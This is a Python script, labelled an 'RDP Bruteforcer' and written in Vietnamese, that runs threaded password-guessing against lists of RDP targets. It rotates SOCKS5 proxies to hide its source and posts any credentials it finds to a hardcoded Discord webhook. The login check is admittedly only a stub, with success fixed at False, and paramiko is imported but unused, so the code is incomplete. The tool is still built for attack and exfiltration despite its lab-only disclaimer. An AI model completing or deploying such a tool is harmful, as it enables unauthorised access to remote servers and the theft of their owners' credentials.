#!/usr/bin/env python3
import sys
import socket
import paramiko
import threading
import time
import random
import os
import requests
import json
from colorama import Fore, Style, init

# Khởi tạo colorama
init()

# Discord Webhook URL
DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1312529063692210268/o4QgkWrBEErS0Tex0T6g7bm5HUvsIN0zEfgBhIxJxznEPwDwcva8hHdy47mzcv8gYiUi"

print(Fore.CYAN + """
██████╗ ██████╗ ██████╗     ██████╗ ██████╗ ██╗   ██╗████████╗███████╗███████╗ ██████╗ ██████╗  ██████╗███████╗
██╔══██╗██╔══██╗██╔══██╗    ██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔════╝██╔════╝██╔═══██╗██╔══██╗██╔════╝██╔════╝
██████╔╝██║  ██║██████╔╝    ██████╔╝██████╔╝██║   ██║   ██║   █████╗  █████╗  ██║   ██║██████╔╝██║     █████╗  
██╔══██╗██║  ██║██╔═══╝     ██╔══██╗██╔══██╗██║   ██║   ██║   ██╔══╝  ██╔══╝  ██║   ██║██╔══██╗██║     ██╔══╝  
██║  ██║██████╔╝██║         ██████╔╝██║  ██║╚██████╔╝   ██║   ███████╗██║     ╚██████╔╝██║  ██║╚██████╗███████╗
╚═╝  ╚═╝╚═════╝ ╚═╝         ╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝╚═╝      ╚═════╝ ╚═╝  ╚═╝ ╚═════╝╚══════╝
                                                                                                       
""" + Style.RESET_ALL)
print(Fore.YELLOW + "Chỉ sử dụng cho mục đích nghiên cứu trên môi trường lab cá nhân" + Style.RESET_ALL)
print(Fore.RED + "Tác giả không chịu trách nhiệm nếu sử dụng vào mục đích phi pháp" + Style.RESET_ALL)
print("\n")

# Kiểm tra các file cần thiết
required_files = ['ip_lists.txt', 'usernames.txt', 'passwords.txt', 'proxies.txt']
for file in required_files:
    if not os.path.exists(file):
        print(f"[!] Không tìm thấy file {file}. Vui lòng kiểm tra lại.")
        sys.exit(1)

# Đọc danh sách IP từ file
def read_file(filename):
    with open(filename, 'r') as f:
        return [line.strip() for line in f if line.strip()]

# Gửi thông báo đến Discord webhook
def send_to_discord(ip, port, username, password):
    try:
        data = {
            "embeds": [{
                "title": "Phát hiện thông tin đăng nhập RDP!",
                "description": f"Tìm thấy thông tin đăng nhập hợp lệ!",
                "color": 65280,  # Màu xanh lá
                "fields": [
                    {"name": "IP:Port", "value": f"`{ip}:{port}`", "inline": True},
                    {"name": "Username", "value": f"`{username}`", "inline": True},
                    {"name": "Password", "value": f"`{password}`", "inline": True},
                    {"name": "Thời gian", "value": f"<t:{int(time.time())}:F>", "inline": False}
                ],
                "footer": {"text": "RDP Bruteforcer"}
            }]
        }
        
        headers = {
            "Content-Type": "application/json"
        }
        
        response = requests.post(DISCORD_WEBHOOK, data=json.dumps(data), headers=headers)
        
        if response.status_code == 204:
            print(f"{Fore.GREEN}[+] Đã gửi thông báo thành công đến Discord{Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}[-] Không thể gửi thông báo đến Discord: {response.status_code}{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}[-] Lỗi khi gửi thông báo đến Discord: {str(e)}{Style.RESET_ALL}")

# Đọc dữ liệu từ các file
ip_list = read_file('ip_lists.txt')
usernames = read_file('usernames.txt')
passwords = read_file('passwords.txt')
proxies = read_file('proxies.txt')

print(f"[+] Đã tải {len(ip_list)} địa chỉ IP")
print(f"[+] Đã tải {len(usernames)} tên đăng nhập")
print(f"[+] Đã tải {len(passwords)} mật khẩu")
print(f"[+] Đã tải {len(proxies)} proxy")

# Lớp xử lý kết nối RDP thông qua socket
class RDPBruteforcer:
    def __init__(self, target_ip, target_port, use_proxy=False):
        self.target_ip = target_ip
        self.target_port = int(target_port)
        self.use_proxy = use_proxy
        self.successful = []
        self.lock = threading.Lock()
        self.attempt_count = 0
        self.start_time = time.time()
        
    def parse_proxy(self, proxy_str):
        # Xử lý chuỗi proxy, ví dụ: socks5://51.158.70.181:16379
        parts = proxy_str.split('://')
        if len(parts) != 2:
            return None, None, None
        
        proxy_type = parts[0]
        addr_parts = parts[1].split(':')
        if len(addr_parts) != 2:
            return None, None, None
            
        proxy_host = addr_parts[0]
        proxy_port = int(addr_parts[1])
        
        return proxy_type, proxy_host, proxy_port
        
    def try_login(self, username, password, proxy=None):
        self.attempt_count += 1
        
        # Nếu sử dụng proxy, cấu hình proxy
        proxy_sock = None
        if proxy and self.use_proxy:
            proxy_type, proxy_host, proxy_port = self.parse_proxy(proxy)
            if not proxy_type:
                return False
                
            try:
                # Thử kết nối qua proxy
                if proxy_type.lower() == 'socks5':
                    import socks
                    proxy_sock = socks.socksocket()
                    proxy_sock.set_proxy(socks.SOCKS5, proxy_host, proxy_port)
                    proxy_sock.settimeout(10)
                    proxy_sock.connect((self.target_ip, self.target_port))
                else:
                    return False
            except Exception as e:
                return False
        
        # Kết nối trực tiếp (không qua proxy)
        sock = None
        try:
            if proxy_sock:
                sock = proxy_sock
            else:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                sock.connect((self.target_ip, self.target_port))
            
            # Thực hiện xác thực RDP (mô phỏng - trong thực tế cần sử dụng thư viện RDP thực tế)
            # Đây chỉ là ví dụ mô phỏng, cần thay thế bằng code xác thực RDP thực tế
            
            # Trong thực tế, bạn sẽ cần sử dụng thư viện như pyfreerdp hoặc thư viện tương tự
            # để thực hiện kết nối và xác thực RDP thực tế
            
            # Mô phỏng thành công (giả định)
            success = False
            
            # Ghi lại thông tin nếu thành công
            if success:
                with self.lock:
                    self.successful.append((self.target_ip, self.target_port, username, password))
                    print(f"\n{Fore.GREEN}[+] Thành công! {self.target_ip}:{self.target_port} - {username}:{password}{Style.RESET_ALL}")
                    
                    # Lưu vào file
                    with open('successful_logins.txt', 'a') as f:
                        f.write(f"{self.target_ip}:{self.target_port} - {username}:{password}\n")
                    
                    # Gửi thông báo đến Discord
                    send_to_discord(self.target_ip, self.target_port, username, password)
                        
                return True
                
        except socket.timeout:
            return False
        except ConnectionRefusedError:
            return False
        except Exception as e:
            return False
        finally:
            if sock:
                sock.close()
                
        return False
        
    def run_attack(self, max_threads=10):
        print(f"\n{Fore.CYAN}[*] Bắt đầu tấn công {self.target_ip}:{self.target_port}{Style.RESET_ALL}")
        
        threads = []
        thread_count = min(max_threads, len(usernames) * len(passwords))
        
        for username in usernames:
            for password in passwords:
                # Chọn proxy ngẫu nhiên nếu có
                proxy = random.choice(proxies) if proxies and self.use_proxy else None
                
                # Tạo và chạy thread
                t = threading.Thread(target=self.try_login, args=(username, password, proxy))
                threads.append(t)
                t.start()
                
                # Giới hạn số lượng thread đồng thời
                while sum(1 for t in threads if t.is_alive()) >= max_threads:
                    time.sleep(0.1)
                    
                # Hiển thị tiến trình
                elapsed = time.time() - self.start_time
                attempts_per_second = self.attempt_count / elapsed if elapsed > 0 else 0
                sys.stdout.write(f"\r{Fore.YELLOW}[*] Đang thử: {username}:{password} | " +
                                f"Số lượt thử: {self.attempt_count} | " +
                                f"Tốc độ: {attempts_per_second:.2f} lần/giây{Style.RESET_ALL}")
                sys.stdout.flush()
                
        # Đợi tất cả thread hoàn thành
        for t in threads:
            t.join()
            
        print(f"\n{Fore.CYAN}[*] Hoàn thành tấn công {self.target_ip}:{self.target_port}{Style.RESET_ALL}")
        
        return self.successful

def main():
    use_proxy = input("Sử dụng proxy? (y/n): ").lower() == 'y'
    max_threads = int(input("Số lượng thread tối đa (khuyến nghị 10-20): ") or "10")
    
    for target in ip_list:
        try:
            ip, port = target.split(':')
        except ValueError:
            ip = target
            port = "3389"  # Port mặc định cho RDP
            
        bruteforcer = RDPBruteforcer(ip, port, use_proxy)
        successful = bruteforcer.run_attack(max_threads=max_threads)
        
        if successful:
            print(f"\n{Fore.GREEN}[+] Tìm thấy {len(successful)} thông tin đăng nhập cho {ip}:{port}{Style.RESET_ALL}")
        else:
            print(f"\n{Fore.RED}[-] Không tìm thấy thông tin đăng nhập nào cho {ip}:{port}{Style.RESET_ALL}")
            
    print(f"\n{Fore.CYAN}[*] Tấn công hoàn thành. Kết quả đã được lưu vào successful_logins.txt{Style.RESET_ALL}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[!] Đã hủy bởi người dùng{Style.RESET_ALL}")
    except Exception as e:
        print(f"\n{Fore.RED}[!] Lỗi: {str(e)}{Style.RESET_ALL}") 